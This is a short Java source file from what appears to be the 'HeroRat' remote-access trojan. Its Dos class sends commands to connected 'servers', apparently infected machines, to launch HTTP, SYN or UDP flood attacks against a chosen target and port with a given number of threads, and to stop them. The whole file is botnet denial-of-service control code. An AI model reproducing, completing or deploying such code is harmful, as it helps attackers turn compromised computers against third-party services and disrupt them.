package net.herorat.features.dos;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet3Dos;


public class Dos
{
	public static void sendHttp(Server server, String target, int threads)
	{
		Packet p = new Packet3Dos(server.outputstream, new String[] { "http", target, String.valueOf(threads) });
		p.write();
	}
	
	public static void sendSyn(Server server, String target, int port, int threads)
	{
		Packet p = new Packet3Dos(server.outputstream, new String[] { "syn", target, String.valueOf(threads), String.valueOf(port) });
		p.write();
	}
	
	public static void sendUdp(Server server, String target, int threads)
	{
		Packet p = new Packet3Dos(server.outputstream, new String[] { "udp", target, String.valueOf(threads) });
		p.write();
	}
	
	public static void sendStop(Server server)
	{
		Packet p = new Packet3Dos(server.outputstream, new String[] { "stop" });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
	}
}